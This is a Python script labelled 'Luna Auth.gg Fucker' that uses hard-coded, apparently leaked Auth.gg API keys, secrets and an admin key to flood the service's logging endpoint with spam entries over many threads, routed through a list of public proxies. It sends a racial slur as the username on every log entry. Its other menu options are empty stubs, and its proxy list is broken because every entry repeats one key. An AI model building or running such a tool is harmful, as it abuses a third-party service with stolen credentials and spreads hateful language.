import os
import discord
import json
import asyncio
import random
import time
import datetime
import requests
from CEA256 import *

from AuthGG.client import Client
from AuthGG.admin import AdminClient

import threading

# ///////////////////////////////////////////////////////////////
# Proxies

proxies = {
    "http": "http://203.150.128.208:8080",
    "http": "http://182.111.172.108:32997",
    "http": "http://106.55.31.128:9999",
    "http": "http://47.92.234.75:80",
    "http": "http://103.245.108.186:8000",
    "http": "http://201.28.120.142:3128",
    "http": "http://47.243.200.250:59394",
    "http": "http://203.189.89.158:8080",
    "http": "http://50.206.25.109:80",
    "http": "http://43.129.174.230:9999",
    "http": "http://193.19.97.152:8080",
    "http": "http://193.164.131.202:7890",
    "http": "http://88.198.24.108:8080",
    "http": "http://59.66.142.35:7890",
    "http": "http://47.243.196.231:59394",
    "http": "http://178.73.192.3:8888",
    "http": "http://49.233.173.151:9080",
    "http": "http://20.194.181.91:80",
    "http": "http://103.99.8.106:83",
    "http": "http://212.112.127.20:8080",
    "http": "http://47.56.120.158:80",
    "http": "http://213.163.2.206:3128",
    "http": "http://51.79.144.52:8000",
    "http": "http://203.189.231.154:8080",
    "http": "http://212.95.75.12:80",
    "http": "http://85.26.146.169:80",
    "http": "http://51.159.5.133:3128",
    "http": "http://200.114.97.4:999",
    "http": "http://47.52.134.184:8118",
    "http": "http://107.151.182.247:80",
    "http": "http://50.206.25.104:80",
    "http": "http://51.81.155.78:3128",
    "http": "http://218.86.87.171:31661",
    "http": "http://221.131.158.246:8888",
    "http": "http://94.130.151.31:80",
    "http": "http://58.20.234.243:9091",
    "http": "http://212.92.204.54:8080",
    "http": "http://50.206.25.106:80",
    "http": "http://50.233.42.98:51696",
    "http": "http://159.192.226.46:8080",
    "http": "http://213.182.139.164:8080",
    "http": "http://50.206.25.110:80",
    "http": "http://159.65.132.219:1234",
    "http": "http://51.222.124.242:3128",
    "http": "http://58.187.46.247:4204",
    "http": "http://221.125.138.189:80",
    "http": "http://51.222.124.243:3128",
    "http": "http://164.163.12.50:8080",
    "http": "http://171.67.43.170:8080",
    "http": "http://58.115.241.109:80"
}

# ///////////////////////////////////////////////////////////////
# Authgg module

import requests
import socket

from AuthGG import error_handler

class Logging:
    def __init__(self, aid: str, apikey: str, secret: str):
        self.aid = aid
        self.apikey = apikey
        self.secret = secret


    def sendData(self, username: str, message: str):

        data = {
            "type": "log",
            "action": message,
            "pcuser": "Nxsa#6899",
            "username": username,
            "aid": self.aid,
            "secret": self.secret,
            "apikey": self.apikey
        }
        requests.post(f"https://api.auth.gg/v1/", data=data, proxies=proxies)    

# ///////////////////////////////////////////////////////////////

logo = f"""  *                        o              +                 *                 .
       O                     .              .                      .                   *
               .                ██╗     ██╗   ██╗███╗  ██╗ █████╗    .-.,="``"=. +            |
 .                     *        ██║     ██║   ██║████╗ ██║██╔══██╗   `=/_       \           - o -
                                ██║     ██║   ██║██╔██╗██║███████║    |  '=._    |      .     |
            |              +    ██║     ██║   ██║██║╚████║██╔══██║  *  \     `=./`, 
    *     - o -                 ███████╗╚██████╔╝██║ ╚███║██║  ██║      `=.__.=` `=`             O
            |        .          ╚══════╝ ╚═════╝ ╚═╝  ╚══╝╚═╝  ╚═╝             *    
                              .                      o                    .                  +
"""

# ///////////////////////////////////////////////////////////////

class files:
	def documents():
		return os.path.expanduser("~/Documents")
	def file_exist(file_name, documents=False):
		"""Checks if a file exists"""
		if documents:
			return os.path.exists(os.path.join(files.documents(), file_name))
		else:
			return os.path.exists(file_name)
	def write_file(path, content, documents=False, byte=False):
		"""Writes a file"""
		if documents and byte:
			with open(os.path.join(files.documents(), path), "wb") as f:
				f.write(content)
		elif documents:
			with open(os.path.join(files.documents(), path), 'w') as f:
				f.write(content)
		else:
			with open(path, 'w') as f:
				f.write(content)
	def write_json(path, content, documents=False):
		"""Writes a json file"""
		if documents:
			with open(os.path.join(files.documents(), path), "w") as f:
				f.write(json.dumps(content, indent=4))
		else:
			with open(path, "w") as f:
				f.write(json.dumps(content, indent=4))
	def read_file(path, documents=False):
		"""Reads a file"""
		if documents:
			with open(os.path.join(files.documents(), path), 'r', encoding="utf-8") as f:
				return f.read()
		else:
			with open(path, 'r', encoding="utf-8") as f:
				return f.read()
	def append_file(path, content):
		"""Appends to a file"""
		with open(path, 'a') as f:
			f.write(content)
	def delete_file(path, documents=False):
		"""Deletes a file"""
		if documents:
			os.remove(os.path.join(files.documents(), path))
		else:
			os.remove(path)
	def create_folder(path, documents=False):
		"""Creates a folder"""
		if documents:
			if not os.path.exists(os.path.join(files.documents(), path)):
				os.makedirs(os.path.join(files.documents(), path))
		else:
			if not os.path.exists(path):
				os.makedirs(path)
	def json(file_name, value, documents=False):
		"""Reads a json file"""
		if documents:
			return json.load(open(os.path.join(files.documents(), file_name), encoding="utf-8"))[value]
		else:
			return json.load(open(file_name, encoding="utf-8"))[value]
	def remove(path, documents=False):
		"""Removes a file"""
		if documents:
			if os.path.exists(os.path.join(files.documents(), path)):
				os.remove(os.path.join(files.documents(), path))
		else:
			if os.path.exists(path):
				os.remove(path)

# ///////////////////////////////////////////////////////////////

class color:
	error = '\033[38;2;225;9;89m'
	reset = "\033[0m"

	def logo_gradient(text):
		"""Gradient for the logo"""
		gradient = files.json("Luna/console/console.json", "logo_gradient", documents=True)
		match gradient:
			case "1":
				return color.purple_blue(f"""{text}""")
			case "2":
				return color.purple_cyan(f"""{text}""")
			case "3":
				return color.pink_red(f"""{text}""")
			case "4":
				return color.blue_cyan(f"""{text}""")
			case "5":
				return color.green_blue(f"""{text}""")
			case "6":
				return color.orange_red(f"""{text}""")
			case "7":
				return color.black_white(f"""{text}""")
		if int(gradient) > 7:
			return color.purple_blue(f"""{text}""")

	def print_gradient(text):
		"""Gradient for the console"""
		gradient = files.json("Luna/console/console.json", "print_gradient", documents=True)
		match gradient:
			case "1":
				return color.purple(f"{text}")
			case "2":
				return color.blue(f"{text}")
			case "3":
				return color.green(f"{text}")
			case "4":
				return color.yellow(f"{text}")
			case "5":
				return color.red(f"{text}")
			case "6":
				return color.black(f"{text}")
		if int(gradient) > 6:
			return color.purple(f"{text}")

	def black(text):
		os.system(""); faded = ""
		for line in text.splitlines():
			red = 0; green = 0; blue = 0
			for character in line:
				red += 20; green += 20; blue += 20
				if red > 255 and green > 255 and blue > 255:
					red = 255; green = 255; blue = 255
				faded += (f"\033[38;2;{red};{green};{blue}m{character}\033[0m")
		return faded

	def green(text):
		os.system(""); faded = ""
		for line in text.splitlines():
			blue = 100
			for character in line:
				blue += 20
				if blue > 255:
					blue = 255
				faded += (f"\033[38;2;0;255;{blue}m{character}\033[0m")
		return faded

	def blue(text):
		os.system(""); faded = ""
		for line in text.splitlines():
			green = 0
			for character in line:
				green += 20
				if green > 255:
					green = 255
				faded += (f"\033[38;2;0;{green};255m{character}\033[0m")
		return faded

	def yellow(text):
		os.system(""); faded = ""
		for line in text.splitlines():
			red = 0
			for character in line:
				if not red > 200:
					red += 20
				faded += (f"\033[38;2;{red};255;0m{character}\033[0m")
		return faded

	def red(text):
		os.system(""); faded = ""
		for line in text.splitlines():
			green = 250
			for character in line:
				green -= 20
				if green < 0:
					green = 0
				faded += (f"\033[38;2;255;{green};0m{character}\033[0m")
		return faded

	def purple(text):
		os.system(""); faded = ""; down = False
		for line in text.splitlines():
			# red = 40
			red = 137
			green = 142
			blue = 255
			for character in line:
				if down:
					red -= 3
				else:
					red += 3
				if red > 254:
					red = 255
					down = True
				elif red < 1:
					red = 30
					down = False

				if down:
					green += 3
				else:
					green -= 3
				if green > 254:
					green = 255
					down = True
				elif green < 1:
					green = 30
					down = False
				faded += (f"\033[38;2;{red};{green};{blue}m{character}\033[0m")
		return faded

	def purple_blue(text):
		os.system(""); faded = ""
		red = 137
		green = 142
		blue = 255
		for line in text.splitlines():
			faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
			if not green == 0:
				green -= 5
				if green < 0:
					green = 0
			if not red == 255:
				red += 5
				if red > 255:
					red = 255
		return faded

	def purple_cyan(text):
		os.system(""); faded = ""
		red = 0
		green = 255
		blue = 255
		for line in text.splitlines():
			faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
			if not red == 255:
				red += 22
				if red < 0:
					red = 0
			if not green == 0:
				green -= 40
				if green < 0:
					green = 0
		return faded

	def pink_red(text):
		os.system(""); faded = ""
		blue = 255
		for line in text.splitlines():
			faded += (f"\033[38;2;255;0;{blue}m{line}\033[0m\n")
			if not blue == 0:
				blue -= 20
				if blue < 0:
					blue = 0
		return faded

	def black_white(text):
		os.system(""); faded = ""
		red = 0; green = 0; blue = 0
		for line in text.splitlines():
			faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
			if not red == 255 and not green == 255 and not blue == 255:
				red += 20; green += 20; blue += 20
				if red > 255 and green > 255 and blue > 255:
					red = 255; green = 255; blue = 255
		return faded

	def blue_cyan(text):
		os.system(""); faded = ""
		green = 10
		for line in text.splitlines():
			faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
			if not green == 255:
				green += 15
				if green > 255:
					green = 255
		return faded

	def green_blue(text):
		os.system(""); faded = ""
		blue = 100
		for line in text.splitlines():
			faded += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
			if not blue == 255:
				blue += 15
				if blue > 255:
					blue = 255
		return faded

	def orange_red(text):
		os.system(""); faded = ""
		green = 250
		for line in text.splitlines():
			faded += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
			if not green == 0:
				green -= 25
				if green < 0:
					green = 0
		return faded

# ///////////////////////////////////////////////////////////////

AdminClientKey = AdminClient("WDSMDRHYVFHD")

# ///////////////////////////////////////////////////////////////

choice = 0

def start(delay = False):
    global choice
    if delay:
        time.sleep(10)
    os.system("cls")
    print(color.purple_blue(logo))
    print("Luna Auth.gg Fucker | Proxy Only".center(os.get_terminal_size().columns))
    print()
    print(f'{color.purple("1")} = Spam logs')
    print(f'{color.purple("2")} = Join guild')
    print(f'{color.purple("3")} = Spam message')
    print(f'{color.purple("4")} = Token check')
    print()
    choice = int(input(color.purple("Choice: ")))
    init()

# ///////////////////////////////////////////////////////////////

client = Logging(aid="571492", apikey='9769892324696521437936494687419933645728555', secret='hdcyC1VvDapYpEOvDwtVBZPbGpKoXxu3a2I')

amount = 0
delay = 0
msg = ""

def logger_thread():
	sent = 0
	global _thread
	while True:
		for x in range(amount):
			client.sendData(username='Nigger', message=msg)
			sent += 1
			print(f"{sent} | Sent: {msg}")
			time.sleep(int(delay))

def init():
	match choice:

		# ///////////////////////////////////////////////////////////////
		case 1:
			global amount
			global delay
			global msg
			amount = int(input(color.purple("Amount: ")))
			msg = str(input(color.purple("Message: ")))
			delay = int(input(color.purple("Delay: ")))
			thread_amount = int(input(color.purple("Threads: ")))

			_thread = 0
			for x in range(thread_amount):
				try:
					_thread += 1
					log_thread = threading.Thread(target=logger_thread)
					log_thread.start()
					print(f"Started thread {color.purple(_thread)}")
				except:
					print("Error: unable to start thread")

			start(delay=True)

		# ///////////////////////////////////////////////////////////////
		case 2:
			
			start(delay=True)
		
		# ///////////////////////////////////////////////////////////////
		case 3:
			
			start(delay=True)
		
		# ///////////////////////////////////////////////////////////////
		case 4:
			
			start(delay=True)

start()

